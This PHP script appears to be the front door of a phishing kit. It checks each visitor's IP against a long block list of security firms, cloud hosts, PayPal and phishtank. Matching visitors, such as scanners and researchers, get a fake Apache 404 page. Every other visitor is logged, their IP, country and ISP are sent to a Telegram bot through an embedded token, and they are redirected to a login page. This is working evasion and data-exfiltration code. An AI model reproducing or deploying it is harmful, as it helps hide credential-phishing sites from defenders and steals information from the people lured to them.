<?php
session_start(); // MUST be the very first thing after <?php

$blocked_strings = array(
    '46.229.224','85.237.234.69','91.228.164.23','84.245.120.245','102.66.240','VPS.net','41.160.35.134','41.73.41','Cipherwave','102.66.240.229','Dimension Data','196.23.168','41.206.98','Ukraine','Xneelo','XNEELO','host','HOST','Russia','QuadraNet','Nexeon','67.174.194.211','FAIRPOINT COMMUNICATIONS','Israel','ISRAEL','35.225.82','UAB "Bite Lietuva"','76.101.125','193.128.114','Cebridge Connections','Higher Education','34.105.37','Epic LTD','98.98.166.190','24.101.33.143','76.105.204.18','Celltex','Consolidated Smart Systems','Kirino','Valley Electric','73.47.171.62','ZSCALER','MicroLogic','Altibox','Scancom','Netforest','Level','RCN','VeloxServ','ColocationX','Yandex', 'GoDaddy.com','Amazon.com','Strong Technology','TalkTalk','DigitalOcean','SEMrush CY LTD','Datapark','84.254.89.162','217.71.253.0','195.186.208.','195.186.208.182','195.202.221.119','2a02:aa14:7280:1f80:3870:bb47:5b8:5708','31.10.144.204','195.202.233.192','213.55.225.75','2a01:b540:c:b100:28:a271:e414:95f1','KFN','31.31.48.132','DOLPHINS','METANET','Metanet','5.145.73.208','Finecom Telecommunications','212.40.1.4','31.31.48.133','91.102.199.228','SysEleven','OARnet','Trabia','RelAix Networks','Clouvider','Cable 4 GmbH','VPN','backbone','DNA Oyj','Netvision','G.Network Communications','COLT','Gamma Telecom','Warner Bros','Clouvider','infomaniak','Infomaniak','Contabo','strato','Strato','Kyndryl Deutschland Aviation','GSL Networks Pty','BABBAR','Dataport AoR','host','Host','inexio Informationstechnologie','host','ANEXIA Internetdienstleistungs','TIROLNET','host','Clouvider','Hydra Communications Ltd','VF-Network','89.204.138.199','18 originates by AS35244','Arvato Systems GmbH','Magistrat der Stadt Wien, abteilung 01','84.115.221.234','91.12.27.200','81.151.176.168','PURtel.com GmbH','PT Comunicacoes','TARR Ltd','194.230.144.77','79.238.213.26','Init7','netcup GmbH','PJSC','Global Colocation Limited','88.152.128.177','Network of Hutchison Drei','80.151.204.254','Ssl1','ColoUp','Level 7 Wireless', 'Apple Inc', 'Latitude.sh', 'M247', 'Amazone', 'DigitalOcean', 'Amazon', 'Google', 'phishtank', 'net4sec', 'AVAST Software s.r.o.', 'BullGuard ApS', 'PayPal', 'Hotmail', 'Yahoo', 'AOL', 'Microsoft', 'Kaspersky Lab', 'Linode', 'MSN', 'Online S.A.S.', 'Joshua Peter McQuistan', 'OVH SAS', 'avira', 'Forcepoint', 'Cloud', 'Forcepoint Cloud Ltd', 'Google', 'Facebook', 'HostRoyale', 'Green Floid LLC', 'The Constant Company', 'ONLINE S.A.S', 'H4Y Technologies', 'Datacamp Limited', 'Digital Network', 'Intelligence Network Online', 'Geekyworks IT Solutions', 'The Calyx Institute', 'Perimeter', 'TerraTransit', 'Hurricane Electric', 'Uninet S.A.', 'AVAST', 'Microsense', 'PALO ALTO NETWORKS', 'ServeByte', 'Fastly','Fastweb', 'fastweb','Security', 'Google LLC', 'Overplay', 'Netprotect', 'Strong Technology', 'Web2Objects', 'tzulo', 'NETPROTECT', 'GleSYS', 'Cloudflare', 'Cloudflare, Inc.', 'Axera SpA', 'Axera S.P.A.', 'DedFiberCo', 'VISPERAD NETWORKS', 'EGIHosting', 'NAVER Cloud', 'Dreamx', 'DIMENOC SERVICOS DE INFORMATICA', 'HostDime', 'Powerhouse', 'Powerhouse Management', 'Unus, Inc.', 'Cisco', 'Cisco OpenDNS LLC', 'Twitter', 'Hetzner', 'Telegram', 'TEFINCOM', 'Tefincom', 'Packethub', 'AWS EC2', 'Forcepoint Cloud', 'Forcepoint', 'Paradise Networks', 'CenturyLink Communications', 'NEXT GLOBAL SERVICES', 'Next Global Services', 'UAB code200', 'Ovh', 'ovh', 'Liteserver', 'Leaseweb', 'Space Exploration Technologies', 'SpaceX Services', 'SpaceX Services, Inc', 'UNINET', 'Jisc Services', 'University of Bath', 'Bath University', 'Synergy Wholesale PTY LTD', 'SYNERGY WHOLESALE PTY LTD', 'IPXO UK LIMITED', 'Ipxo UK Limited', 'QuickPacket', 'BraveWay', 'Geekyworks', 'NETROTECT-BOM', 'myLoc', 'Microplex', 'SCALEWAY', 'Datacamp', 'INCX Global', 'Windscribe', 'Blix Solutions', 'Blix', 'Universal Layer', 'Vultr', 'Datacenter', 'Server', 'server', 'Hosting', 'hosting', 'External Content Distribution Network', 'Rural Telephone Service Company', 'American Registry Internet Numbers', 'Internet Numbers', 'Hi3G Access AB', 'Hi3gaccess', 'Digital Network JSC', 'Digital Network', 'Level 3 Communications', 'Level3', 'Webline Services', 'WhiteLabelColo', 'WhiteSky Communications', 'WhiteSky', 'WhiteSky', 'QuickPacket', 'BraveWay', 'Colocation America Corporation', 'Segna Technologies', 'Digital Ocean', 'Google Cloud', 'Strong Technology', 'Emerald Onion', 'Shock Hosting', 'AxcelX', 'W I X NET DO BRASIL LTDA', 'Qnax Ltda', 'Telepoint Ltd', 'Akamai Technologies', 'Proofpoint', 'SEWAN', 'SEWAN SAS', 'ORG-SCS33-RIPE', 'Unus, Inc.', 'AltusHost', 'Iseek Communications', 'Iseek', 'Euskaltel', 'GTT Communications', 'ANTISPAMEUROPE', 'ANTISPAM', 'MK Netzdienste GmbH', 'OVPN Integritet', 'OVPN', '31173 Services AB', 'Hostway', 'Verlag Heinz Heise GmbH', 'Deutscher Wetterdienst', 'Keyweb', 'Chang Way', 'Starcrecium', 'The Calyx', 'Calyx', 'FORTINET', 'FORTINET TECHNOLOGIES', 'Fortinet', 'fortinet', 'Fortinet Inc', 'Oculus Networks', 'Oculus', 'Shadow Server', 'Hurricane', 'Ovpn', 'ovpn', 'NForce', 'Globalhost', 'Web Hosting', 'Rootnerds', 'Amanah Tech', 'O2 Online', 'INCX', 'INCX', 'ThoughtPort', 'Halo Colocation', 'Halo Colocation LLC', 'ThoughtPort Networking', 'GetNet', 'SERVERFIELD', 'Cdnext', 'Ipxo', 'Quintex', 'FranTech', 'myLoc managed', 'FranTech Solutions', 'ITN Ssl1 OL', 'Universitaet Stuttgart', 'Core-Backbone', 'Webinvest International SA', 'Hornetsecurity', 'security', 'Security', 'EstNOC OY', 'ESTNOC-GLOBAL', 'Cogent', 'Cogent Communications', 'cogent', 'Amazon Technologies Inc.', 'Amazon', 'AWS EC2 (eu-west-2)', 'AWS', 'Aws', 'aws', 'PlusNet plc', 'PlusNet', 'plusnet', 'TalkTalk', 'Level 3 Communications', 'Dedicated Servers', 'Keliweb', 'Strong Technology', 'GleSYS', 'Hivelocity', 'LeaseWeb', 'Red IP Multi Acceso', 'Red de servicios IP', 'Lite Info LLC', '31173 Services', 'ExcellMedia', 'Excell Media', 'First Dinahosting', 'DinaHosting', 'Bla001', 'SONDATECH', 'Sondatech', 'FORTINET', 'DH-J2', 'Apogee Telecom', 'WiscNet', ' OLIVE ', 'Olive', 'Lite Info', 'Administracion', 'Administration' 
);

function getIpInfo($ip = '')
{
    $ipinfo = file_get_contents("http://ip-api.com/json/" . $ip . "");
    return json_decode($ipinfo, true); // always return array
}

function containsBlockedString($ipinfo_json, $blocked_strings)
{
    foreach ($blocked_strings as $blocked_string) {
        if (stripos(json_encode($ipinfo_json), $blocked_string) !== false) {
            return true;
        }
    }
    return false;
}

$visitor_ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitor_ip);

// Block if any blocked string is found
if (containsBlockedString($ipinfo_json, $blocked_strings)) {
    $blocked_ip_file = fopen("botdl5ra.txt", "a");
    $isp = isset($ipinfo_json['isp']) ? $ipinfo_json['isp'] : 'Unknown';
    $org  = isset($ipinfo_json['org']) ? $ipinfo_json['org'] : 'Unknown';
    $blocked_ip_info = $visitor_ip . " - ISP: " . $isp . " - ORG: " . $org . " - " . gmdate("Y-n-d") . " @ " . gmdate("H:i:s") . "\n";
    fwrite($blocked_ip_file, $blocked_ip_info);
    fclose($blocked_ip_file);

    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    echo '
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at srv190630.hoster-test.ru Port 80</address>
</body></html>';
    exit();
}

// Log every visitor (unchanged)
$file = fopen("v.txt", "a");
fwrite($file, $visitor_ip . "  -  " . gmdate("Y-n-d") . " @ " . gmdate("H:i:s") . "\n");
fclose($file);

// Reuse the already-fetched data instead of doing a second request
$COUNTRY    = isset($ipinfo_json['country'])    ? $ipinfo_json['country']    : 'Unknown';
$CITY       = isset($ipinfo_json['city'])       ? $ipinfo_json['city']       : 'Unknown';
$REGION     = isset($ipinfo_json['region'])     ? $ipinfo_json['region']     : 'Unknown';
$STATE      = isset($ipinfo_json['regionName']) ? $ipinfo_json['regionName'] : 'Unknown';
$ZIPCODE    = isset($ipinfo_json['zip'])        ? $ipinfo_json['zip']        : 'Unknown';
$ISP        = isset($ipinfo_json['isp'])        ? $ipinfo_json['isp']        : 'Unknown';

function sendMessage($token, $chat_id, $message)
{
    $data = [
        'text' => $message,
        'chat_id' => $chat_id
    ];
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

$message = "hello : $visitor_ip\nCountry: $COUNTRY\nISP: $ISP";
$token = '8712281940:AAHeP0QCcb4Sfuexs7YwTwSQdI00y3aeLYQ';
$chat_id = '-5500625079';
sendMessage($token, $chat_id, $message);

// Final redirect – now no output has been sent before this point
header("Location: web/login.php");
exit(); // good practice after redirect